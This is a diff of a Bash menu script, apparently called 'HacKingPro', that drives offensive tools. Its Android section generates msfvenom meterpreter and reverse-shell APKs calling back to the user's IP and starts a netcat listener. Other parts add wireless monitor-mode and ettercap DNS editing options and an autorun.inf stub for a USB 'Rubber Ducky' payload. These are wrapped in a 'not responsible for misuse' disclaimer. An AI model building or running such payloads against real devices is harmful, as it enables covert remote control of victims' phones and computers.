@@ -118,7 +118,6 @@ if [ ${1} == "-i" ]; then
   fi
   targetDns=$2
 fi
-
 if [ ! -z "$targetDns" ]; then
   #statements
   GetIP="$(ping -c 1 "${targetDns}" | grep ttl | cut -d " " -f4 |  tr  -d :)"
@@ -177,9 +176,9 @@ about() {
 
     ${DGrey}┏==⥤ ${Color_Off}[${LRed} ❌ ❗ Warning ❗ ❌ ${Color_Off}]
     ${DGrey}|
-    ${DGrey}┣==⥤ ${Color_Off}[${LRed} I’m not responsible for any misuse or damage caused by this program.❗ ${Color_Off}]
+    ${DGrey}┣==⥤ ${Color_Off}[${LRed} ❗ I’m not responsible for any misuse or damage caused by this program.❗ ${Color_Off}]
     ${DGrey}|
-    ${DGrey}┗==⥤ ${Color_Off}[${LRed} Use this tool at your own ${BRed}Risk! ❗❗${Color_Off}] "
+    ${DGrey}┗==⥤ ${Color_Off}[${LRed} ❗ Use this tool at your own ${BRed}Risk ❗${Color_Off}] "
 
    read -p "$Press_ENTER"
 }
@@ -388,6 +387,28 @@ AwesomeLine(){
   echo "${BBlue}🔮-=x=-=x=-=x=-=x=-=x=-=x=-=${LYellow}[ ${slowBlink}${WhatHeader}${resetT} ${LYellow}]${BBlue}=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-🔮"
   echo "\n${resetT}"
 }
+
+AwesomeAsking(){
+  while  true; do
+    #statements
+    AwesomeAskingEcho="$(echo "
+    ${ORANGE}┌╼▰ ${LGreen}[${LYellow} Start ${BCyan}$1 ${LYellow}${LGreen}] ${ORANGE}──────╼▰ ${LGreen}[ ${BWhite} $@ ${LGreen}]
+    ${ORANGE}┖─╼▰ ${LGreen}[ ${LGrey}y/Y ${LGreen}]${ORANGE}──${LGreen}[ ${LGrey}n/N ${LGreen}] ${ORANGE}──────╼▰  ${LGrey}")"
+    read -p "${AwesomeAskingEcho}" AwesomeAskingCmd
+    case $AwesomeAskingCmd in
+      y|Y|yes|YES)
+      $(echo "$1")
+      ;;
+      n|N|no|NO)
+      break
+      ;;
+      * )
+      break
+      ;;
+    esac
+  done
+}
+
 MiniHeaderSta(){
   echo " ${BYellow}"
   figlet -f small $1
@@ -420,6 +441,7 @@ CheckThatPro(){
 }
 
 CheckRequiredPro(){
+
   AwesomeLine "🔶 Checking Required Programs 🔶"
 
   MiniHeaderSta "System Pack"
@@ -1397,10 +1419,10 @@ Check_System() {
 CheckInternetConnection(){
   ping -c 1 google.com > /dev/null 2>&1
   if [[ "$?" == 0 ]]; then
-    InternetStatus="\n     ${DGrey}[${BYellow} Internet Connection ${DGrey}]${BYellow}${faintT}──${resetT}${BYellow}╼▰ ${DGrey}[${BGreen}${slowBlink} True ${resetT}${DGrey}]${BYellow}${faintT}───────╼${resetT}${BYellow}▰▰▰"
+    InternetStatus="\n     ${DGrey}[${BYellow} Internet Connection ${DGrey}]${BYellow}${faintT}──${resetT}${BYellow}╼▰ ${DGrey}[${BGreen}${slowBlink} ✅ True ✅ ${resetT}${DGrey}]${BYellow}${faintT}───────╼${resetT}${LGreen}▰▰▰ \n"
     echo "${InternetStatus}"
   else
-    InternetStatus="\n     ${DGrey}[${BRed}-${DGrey}]${BYellow}${faintT}──╼  ${resetT}${DGrey}[${BYellow}  Internet Connection ${DGrey}]${BYellow}${faintT}──╼ ${DGrey}[${BRed}${slowBlink} False ${resetT}${DGrey}]"
+    InternetStatus="\n     ${DGrey}[${BRed}❌${DGrey}]${BYellow}${faintT}──╼  ${resetT}${DGrey}[${BYellow}  Internet Connection ${DGrey}]${BYellow}${faintT}──╼ ${DGrey}[${BRed}${slowBlink} ❌ False ❌ ${resetT}${DGrey}] ${BRed}\n"
     echo "${InternetStatus}"
   fi
 }
@@ -1484,6 +1506,12 @@ TargetStatus(){
 TargetStatusRun(){
   ToolStatus=$(echo "
     ${InternetStatus}
+  ${DGrey}┏==⥤ ${Color_Off}[${LRed} ❌ ❗ ☣️ Warning ☣️ ❗ ❌ ${Color_Off}]
+  ${DGrey}|
+  ${DGrey}┣==⥤ ${Color_Off}[${LRed} ❗ I’m not responsible for any misuse or damage caused by this program.❗ ${Color_Off}]
+  ${DGrey}|
+  ${DGrey}┗==⥤ ${Color_Off}[${LRed} ❗ Use this tool at your own ${BRed}Risk ❗${Color_Off}]
+
     ${BCyan}${faintT}┌──${resetT}${BRed}[${BCyan} ${slowBlink}P${resetT} ${BRed}]${faintT}${BCyan}──${resetT}${BCyan}╼▰ ${BRed}[${faintT}${BCyan} ⚡️ Planning and Scoping 🎯 ${BRed}]${BCyan}${faintT}───────╼${resetT}${BCyan}▰▰▰
     ${BCyan}${faintT}|
     ${BCyan}${faintT}|──${resetT}${BRed}[${DGrey} Full Time ${BRed}]${faintT}${BCyan}──╼${resetT} ${BRed}[${DGrey} $(date) ${BRed}]
@@ -1504,11 +1532,15 @@ TargetStatusRun(){
 # START Checking
 AwesomeLine "Welcome to ${HacKingPro}"
 
+#-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0#
 ToolHeaderRun
 Check_System
-CheckInternetConnection
+
 GetLocalNetInfo
-CheckRequiredPro
+AwesomeLine "Welcome to ${HacKingPro}"
+
+AwesomeAsking CheckRequiredPro "Want Checking Requirements?"
+#-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0#
 
 dcdv=$(echo "Define Current Direction Variable")
 AwesomePrint ${dcdv} ${MainDirectoriy}
@@ -1688,16 +1720,13 @@ xDirectories(){
       sleep 0.1
     fi
   else
-    read -p "${Press_ENTER}"
     echo "    ${BGreen}Can't Find Main ${ORANGE}Menu ${BGreen}Folder]"
-    sleep 1
-    read -p "${Press_ENTER}"
   fi
   sleep 0.1
   read -p "${Press_ENTER}"
-
 }
-xDirectories
+AwesomeAsking xDirectories "Listing HacKingPro DDirectories?"
+
 
 ###############################################
 #         Arsenal Cheatsheets
@@ -6280,170 +6309,156 @@ WinPrivPro(){
 }
 
 ## Android Payloads
-CreateAndroidShell(){
-  echo "    ./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
-  msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > $save$paylod.apk
-}
 
 AndroidPayLoadPro(){
+  CreateAndroidShell(){
+    msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > ${MainDirectoriyCaseName}/$payload.apk
+  }
   clear
   while true; do
     #statements
+    cd "${MainDirectoriyCaseName}"
     clear
+    TargetStatusRun
     AndroidPayLoadProMenu=$(echo "
-    ╔═╗╔╗╔╔╦╗╦═╗╔═╗╦╔╦╗     ╔═╗╔═╗╦ ╦╦  ╔═╗╔╦╗
-    ╠═╣║║║ ║║╠╦╝║ ║║ ║║     ╠═╝╠═╣╚╦╝║  ║ ║ ║║
-    ╩ ╩╝╚╝═╩╝╩╚═╚═╝╩═╩╝     ╩  ╩ ╩ ╩ ╩═╝╚═╝═╩╝
+    ${DGrey}┌──${BRed}[${LGreen} NetWorKing ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${BGreen}${slowBlink} NetPro ${resetT}${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BGreen} NetWorKingPro ${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BGreen}${faintT} NetWorKing Controller ${resetT}${BRed}]
+
+    ${LGreen}╔═╗╔╗╔╔╦╗╦═╗╔═╗╦╔╦╗     ${LRed}╔═╗╔═╗╦ ╦╦  ╔═╗╔╦╗
+    ${LGreen}╠═╣║║║ ║║╠╦╝║ ║║ ║║     ${LRed}╠═╝╠═╣╚╦╝║  ║ ║ ║║
+    ${LGreen}╩ ╩╝╚╝═╩╝╩╚═╚═╝╩═╩╝     ${LRed}╩  ╩ ╩ ╩ ╩═╝╚═╝═╩╝${DGrey}
     :::::::::::::::: [ TYPE ] ::::::::::::::::::
 
-    ➡ [p]${LGreen} android/meterpreter/reverse_http
+    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${ORANGE} ${slowBlink}P${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${ORANGE} Planning PayLoad ${BRed}]
+    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Export Name ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${payload} ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Listening IP ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${LocalHostIP} ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Listening Port ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${lport} ${BRed}]${BYellow}╼▰
+    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Payload Location ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${apv} ${BRed}]${BYellow}╼▰
 
-    ${BBlue} LHOST${BCyan} ${LocalHostIP}
-    ${BBlue} LPORT${BCyan} ${set_LPORT}
+    ${DGrey}┏⇢${BYellow}╼▰ ${BRed}[${ORANGE} ${slowBlink}CP${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${ORANGE} Choose PayLoad ${BRed}]
+    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 1 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_http ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 2 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_https ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 3 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_tcp ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 4 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_http ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 5 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_https ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 6 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_tcp ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 7 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_http ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 8 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_https ${BRed}]${BYellow}╼▰
+    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 9 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_tcp ${BRed}]${BYellow}╼▰
 
-    ${ORANGE}➡ [1]${BBlue} android/meterpreter/reverse_http
-    ${ORANGE}➡ [2]${BBlue} android/meterpreter/reverse_https
-    ${ORANGE}➡ [3]${BBlue} android/meterpreter/reverse_tcp
-    ${ORANGE}➡ [4]${BBlue} android/meterpreter_reverse_http
-    ${ORANGE}➡ [5]${BBlue} android/meterpreter_reverse_https
-    ${ORANGE}➡ [6]${BBlue} android/meterpreter_reverse_tcp
-    ${ORANGE}➡ [7]${BBlue} android/shell/reverse_http
-    ${ORANGE}➡ [8]${BBlue} android/shell/reverse_https
-    ${ORANGE}➡ [9]${BBlue} android/shell/reverse_tcp
+    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${LCyan} ${slowBlink}EP${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${LCyan} Export PayLoad ${BRed}]
+    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${BCyan} Export Location ${BRed}]${BYellow}╼▰ ${BRed}[${BCyan} ${MainDirectoriyCaseName}/$paylod.apk  ${BRed}]${BYellow}╼▰
+    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${BGreen} Command Executed ${BRed}]${BYellow}╼▰ ${BRed}[${BGreen} msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > ${MainDirectoriyCaseName}/$payload.apk ${BRed}]${BYellow}╼▰
 
-    :::::::::::::::: [ SELECT ] ::::::::::::::::::")
+    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${LGreen} ${slowBlink}SL${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${LGreen} Start Listener ${BRed}]
+    ${DGrey}┗──⇢${BYellow}╼▰ ${BRed}[${BGreen} Command Executed ${BRed}]${BYellow}╼▰ ${BRed}[${BGreen} nc -l ${lport} ${BRed}]${BYellow}╼▰
+
+    ${BGreen}┏──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}┗──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Exploitation ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Android PayLoad ${BRed}]${BYellow}╼▰  ${BGreen}  ")
     read -p "${AndroidPayLoadProMenu}" cmd
     case "$cmd" in
-      p|pp)
-      clear
-      SettingPayload(){
+      nt|NT|netpro|NetPro)
+      Info_LocalNet
+      while true; do
         clear
-        echo "${BYellow} ENTER YOUR${BBlue} PAYLOD${BYellow} NAME${BCyan}"
-        read "─────➤   "  paylod
-        echo "${BYellow} ENTER YOUR${BBlue} LHOST${BCyan} ${LocalHostIP}"
-        echo "${BYellow} ENTER YOUR${BBlue} LPORT${BCyan}"
-        read "─────➤   "  lport
-        echo "${BYellow} [[[$pink SAVE LOCATION${BYellow} ]]]${BGreen} $rset"
-        echo "➡ [1]${BBlue} /sdcard/ (termux) $rset";
-        echo "➡ [2]${BBlue} /home/kali/Desktop/ (Kali Linux) $rset";
-        echo    "╭─$pink[[[${BYellow} Select any option$pink ]]]${BCyan}"
-        read -p "╰──────────➤ "  h
-        case "$h" in
-          1)
-          clear
-          save='/sdcard/'
-          echo "\n"
-          echo "${BBlue} Conform The Detail"
-          echo "${BCyan} PAYLOD TYPE${BYellow} =${BGreen} $apv"
-          echo "${BCyan} PAYLOD NAME${BYellow} =${BGreen} $paylod"
-          echo "${BCyan} LHOST${BYellow} =${BGreen} $LocalHostIP"
-          echo "${BCyan} LPORT${BYellow} =${BGreen} $lport"
-          echo "${BCyan} SAVE${BYellow} =${BGreen} $save"
-          echo "\n"
-          echo "    ${BRed}   Edit$pink The Detail ?${BGreen} (${BBlue}y${BGreen}/${BRed}n${BGreen})$rset"
-          read e1
-          if [[ $e1 = 'y' ]] ; then
-            clear
-            SettingPayload
-            read -p ${Press_ENTER}
-          else
-            cd "${MainDirectoriyCaseName}"
-            clear
-            echo "./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
-            ./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk
-            read -p ${Press_ENTER}
-          fi
-          ;;
-          2)
-          clear
-          save='/home/kali/Desktop/'
-          echo "${BBlue} Conform The Detail"
-          echo "${BCyan} PAYLOD TYPE${BYellow} =${BGreen} $apv"
-          echo "${BCyan} PAYLOD NAME${BYellow} =${BGreen} $paylod"
-          echo "${BCyan} LHOST${BYellow} =${BGreen} $lhost"
-          echo "${BCyan} LPORT${BYellow} =${BGreen} $lport"
-          echo "${BCyan} SAVE${BYellow} =${BGreen} $save"
-          echo ""
-          echo "    ${BRed}   Edit$pink The Detail ?${BGreen} (${BBlue}y${BGreen}/${BRed}n${BGreen})$rset"
-          read e1
-          if [[ $e1 = 'y' ]] ; then
-            clear
-            SettingPayload
-            read -p ${Press_ENTER}
-          elif [[ $e1 = 'n' ]] ; then
-            cd "${MainDirectoriyCaseName}"
-            clear
-            echo "msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
-            msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk
-            read -p ${Press_ENTER}
-          fi
-          ;;
-          *)
-          clear
-          echo "${BGreen} sorry, the  option you looking is not found"
-          ;;
-        esac
+        ToolHeaderRun
+        TargetStatusRun
+        #statements
+        NetWorKingPro
+      done
+      ;;
+      p|P)
+      SettingPayload(){
+        echo " "
+        echo "    ${DGrey}┏➡ ${BRed}[${ORANGE} Setting PayLoad ${BRed}]${BYellow}╼▰  "
+
+        abc1="$(echo "    ${DGrey}┗┲──⇢ ${BRed}[${ORANGE} Enter File Name ${BRed}]${BYellow}╼▰  ")"
+        if [ -z ${payload} ]; then
+          #statements
+          LocalHostIP="AnLoMinus"
+        else
+          read -p "${abc1}" payload
+        fi
+
+        if [ -z "${LocalHostIP}" ]; then
+          #statements
+          abc2="$(echo "    ${DGrey} ┣──⇢ ${BRed}[${ORANGE} Enter Listening IP ${LocalHostIP} ${BRed}]${BYellow}╼▰  ")"
+          read -p "${abc2}" LocalHostIP
+        fi
+        if [ -z "${LocalHostIP}" ]; then
+        LocalHostIP="127.0.0.1"
+      fi
+
+        abc3="$(echo "    ${DGrey} ┗──⇢ ${BRed}[${ORANGE} Enter Listening Port ${BRed}]${BYellow}╼▰  ")"
+        if [ -z ${lport} ]; then
+          #statements
+          lport="4444"
+        else
+          read -p "${abc3}" lport
+        fi
       }
       SettingPayload
 
       ;;
+      ep|EP)
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      sl|SL)
+      nc -l ${lport}
+      # nc -l ${lport} | nc ${UserName} ${TargetPort}
+      read -p "${Press_ENTER}"
+      ;;
       1)
       clear
       apv='android/meterpreter/reverse_http'
-      CreateAndroidShell
-      read -p "${Press_ENTER}"
       ;;
       2)
       clear
       apv='android/meterpreter/reverse_https'
-      CreateAndroidShell
-      read -p "${Press_ENTER}"
       ;;
       3)
       clear
       apv='android/meterpreter/reverse_tcp'
-      CreateAndroidShell
-      read -p "${Press_ENTER}"
       ;;
       4)
       clear
       apv='android/meterpreter_reverse_http'
-      CreateAndroidShell
-      read -p "${Press_ENTER}"
       ;;
       5)
       clear
       apv='android/meterpreter_reverse_https'
-      CreateAndroidShell
-      read -p "${Press_ENTER}"
       ;;
       6)
       clear
       apv='android/meterpreter_reverse_tcp'
-      CreateAndroidShell
-      read -p "${Press_ENTER}"
       ;;
       7)
       clear
       apv='android/shell/reverse_http'
-      CreateAndroidShell
-      read -p "${Press_ENTER}"
       ;;
       8)
       clear
       apv='android/shell/reverse_https'
-      CreateAndroidShell
-      read -p "${Press_ENTER}"
       ;;
       9)
       clear
       apv='android/shell/reverse_tcp'
-      CreateAndroidShell
-      read -p "${Press_ENTER}"
       ;;
-      00)
+      ls )
+      lahs
+      ;;
+      x|X|exit|quit|Exit )
       clear
-      exit
+      cd ${MainDirectoriy}
+      HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+      echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+      break
+      ;;
+      * )
+      echo "$InvalidOption"
       ;;
     esac
   done
@@ -6467,7 +6482,8 @@ Input_Local_Interface(){
     read LocalHostNAME
   fi
 }
-Info_LocalNeZt(){
+CheckInternetConnection
+Info_LocalNet(){
   Input_Local_Interface
 
   Get_Public_IP=$(dig +short myip.opendns.com @resolver1.opendns.com 2>/dev/null)
@@ -6479,8 +6495,6 @@ Info_LocalNeZt(){
   # Get_Public_IP_Raw_org1=$(echo "${Get_Public_IP_Raw}" | grep "^descr:" | grep -v "^$" | awk '!a[$0]++' | awk -F":" '{print substr($0, index($0,$2))}' | head -1 | xargs | grep -v "^$")
 
 }
-
-
 
 Local_Net_Info(){
   mkdir "${MainDirectoriyCaseNameLocal}"
@@ -6516,7 +6530,6 @@ Local_Net_Info(){
 	echo "$(cat /sys/class/net/*/address)"  >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-Local_Net_Info.log"
 }
 
-#
 # TraceRoute Scan Log
 infoTraceRoute(){
   echo "\n\t\t${BGreen}### TraceRoute Scan Log | Time: $(date)"
@@ -9093,8 +9106,137 @@ AnonymousInstaller(){
 #         HacKingPro Main Menu
 ###############################################
 
+NetWorKingPro(){
+NetWorKingProMenu="$(echo "
+    ╔╗╔┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─┬┌┐┌┌─┐
+    ║║║├┤  │ ││││ │├┬┘├┴┐│││││ ┬
+    ╝╚╝└─┘ ┴ └┴┘└─┘┴└─┴ ┴┴┘└┘└─┘
+
+    ${DGrey}┌─╼ ${BRed}[${BYellow} Networking ${BRed}]
+    ${DGrey}┖─┲─╼ ${BRed}[${BYellow} Control Manager for Networking ${BRed}]
+    ${DGrey}  ┖─╼ ${BRed}[${BYellow} Use it for Easy life ${BRed}]
+
+    ${LGreen}┌─╼ ${BRed}[${LGreen} Public ${BRed}]
+    ${LGreen}┖─┲─╼ ${BRed}[${BGreen} Public IP ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${Get_Public_IP} ${BRed}]${LGreen}╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Public DNS ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${Get_Public_Name} ${BRed}]${LGreen}╼▰
+    ${LGreen}  ┖─╼ ${BRed}[${BGreen} Provider NAME ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${Get_Provider_Name} ${BRed}]${LGreen}╼▰
+
+    ${LGreen}┌─╼ ${BRed}[${LGreen} Local Net Info ${BRed}]
+    ${LGreen}┖─┲─╼ ${BRed}[${BGreen} Host IP ${BRed}]${LGreen}──────╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostIP} ${BRed}]${LGreen}──╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Host NAME ${BRed}]${LGreen}────╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostNAME} ${BRed}]${LGreen}─────╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Gateway IP ${BRed}]${LGreen}───╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayIP} ${BRed}]${LGreen}──╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Gateway NAME ${BRed}]${LGreen}─╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayNAME} ${BRed}]${LGreen}╼▰
+    ${LGreen}  ┖─╼ ${BRed}[${BGreen} Hardware NAME ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${HardwarePort_Name} ${BRed}]${LGreen}─╼▰
+
+    ${DGrey}┌─╼ ${BRed}[${BYellow} Options ${BRed}]
+    ${DGrey}┖─┲──${BYellow}╼▰ ${BRed}[${BWhite} 01 ${BRed}]${BYellow}╼▰ Choose Network Interface
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 02 ${BRed}]${BYellow}╼▰ Enable Monitor Mode
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 03 ${BRed}]${BYellow}╼▰ Disabled Monitor Mode
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 04 ${BRed}]${BYellow}╼▰ Down Interface
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 05 ${BRed}]${BYellow}╼▰ Up Interface
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 06 ${BRed}]${BYellow}╼▰ Restart Network-Manager
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 07 ${BRed}]${BYellow}╼▰ Change My hostname
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 08 ${BRed}]${BYellow}╼▰ Change My MAC Address
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 09 ${BRed}]${BYellow}╼▰ Show My Public IP Address
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 10 ${BRed}]${BYellow}╼▰ Find Live Hosts In My Network
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 11 ${BRed}]${BYellow}╼▰ Open My Router Default Page
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 12 ${BRed}]${BYellow}╼▰ EdIt etter.dns
+    ${DGrey}  └──${BYellow}╼▰ ${BRed}[${BWhite} 13 ${BRed}]${BYellow}╼▰ Edit etter.conf
+
+    ${BGreen}┌──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} NetWorKing ${BRed}]${BYellow}╼▰  ${BGreen}  ")"
+read -p "${NetWorKingProMenu}" Anonselc
+case $Anonselc in
+  1)
+  Info_LocalNet
+  read -p "${Press_ENTER}"
+  ;;
+ 2)
+
+ Enable_Monitor_Mode(){
+   clear
+   if [[ $LocalHostNAME = '' ]];then
+     echo "\n"
+     echo "    You Not Enter the Interface !? "
+     echo "\n"
+     read -p "${Press_ENTER}"
+     clear
+   else
+     echo "\n"
+     airmon-ng start $interface
+     echo "\n"
+     echo "$GREEN    Monitor on ${BBlue}(${BRed}>${BBlue}  $interface ${BRed} <${BBlue})$GREEN has been Enable "
+     echo "\n"
+     read -p "${Press_ENTER}"
+     clear
+   fi
+   read -p "${Press_ENTER}"
+   clear
+ }
+ Enable_Monitor_Mode
+ ;;
+ 3)
+ Diable_Monitor_Mode(){
+   if [[ $interface = '' ]];then
+     echo "\n"
+     echo "    You Not Enter the Interface !? "
+     echo "\n"
+     read -p "${Press_ENTER}"
+     clear
+   else
+     echo "\n"
+     airmon-ng stop $interface
+     echo "\n"
+     echo "$GREEN    Monitor off ${BBlue}(${BRed}>${BBlue}  $interface ${BRed} <${BBlue})$GREEN has been Disabled "
+     echo "\n"
+     read -p "${Press_ENTER}"
+     clear
+   fi
+ }
+ Diable_Monitor_Mode
+
+ ;;
+ p|P )
+ HacKingProPlanning
+ ;;
+ cl )
+ ClearTarget
+ ;;
+ ls )
+ lahs
+ ;;
+ usb)
+ clear
+ # allows you to change any USB stick to Rubber Ducky.
+ CreatePayLoad(){
+   echo " " > payload.bat
+   }
+   echo"
+   [autorun]
+
+   label=RubberDUSB
+
+   icon=RubberDUSB.ico
+
+   open=payload.bat" >> autorun.inf
+ ;;
+ x|X|exit|quit|Exit )
+ clear
+ cd ${MainDirectoriy}
+ HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+ echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+ break
+ ;;
+ * )
+ echo "$InvalidOption"
+ ;;
+esac
+}
+
 MainMenu(){
   while true; do
+    CheckInternetConnection
     clear
     echo ${resetT}
     cd "${MainDirectoriy}"
@@ -9188,135 +9330,8 @@ MainMenu(){
               ToolHeaderRun
               TargetStatusRun
               #statements
-            NetWorKingPro(){
-              NetWorKingProMenu="$(echo "
-    ╔╗╔┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─┬┌┐┌┌─┐
-    ║║║├┤  │ ││││ │├┬┘├┴┐│││││ ┬
-    ╝╚╝└─┘ ┴ └┴┘└─┘┴└─┴ ┴┴┘└┘└─┘
-
-    ${DGrey}┌─╼ ${BRed}[${BYellow} Networking ${BRed}]
-    ${DGrey}┖─┲─╼ ${BRed}[${BYellow} Control Manager for Networking ${BRed}]
-    ${DGrey}  ┖─╼ ${BRed}[${BYellow} Use it for Easy life ${BRed}]
-
-    ${LGreen}┌─╼ ${BRed}[${LGreen} Public ${BRed}]
-    ${LGreen}┖─┲─╼ ${BRed}[${BGreen} Public IP ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${Get_Public_IP} ${BRed}]${LGreen}╼▰
-    ${LGreen}  |─╼ ${BRed}[${BGreen} Public DNS ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${Get_Public_Name} ${BRed}]${LGreen}╼▰
-    ${LGreen}  ┖─╼ ${BRed}[${BGreen} Provider NAME ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${Get_Provider_Name} ${BRed}]${LGreen}╼▰
-
-    ${LGreen}┌─╼ ${BRed}[${LGreen} Local Net Info ${BRed}]
-    ${LGreen}┖─┲─╼ ${BRed}[${BGreen} Host IP ${BRed}]${LGreen}──────╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostIP} ${BRed}]${LGreen}──╼▰
-    ${LGreen}  |─╼ ${BRed}[${BGreen} Host NAME ${BRed}]${LGreen}────╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostNAME} ${BRed}]${LGreen}─────╼▰
-    ${LGreen}  |─╼ ${BRed}[${BGreen} Gateway IP ${BRed}]${LGreen}───╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayIP} ${BRed}]${LGreen}──╼▰
-    ${LGreen}  |─╼ ${BRed}[${BGreen} Gateway NAME ${BRed}]${LGreen}─╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayNAME} ${BRed}]${LGreen}╼▰
-    ${LGreen}  ┖─╼ ${BRed}[${BGreen} Hardware NAME ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${HardwarePort_Name} ${BRed}]${LGreen}─╼▰
-
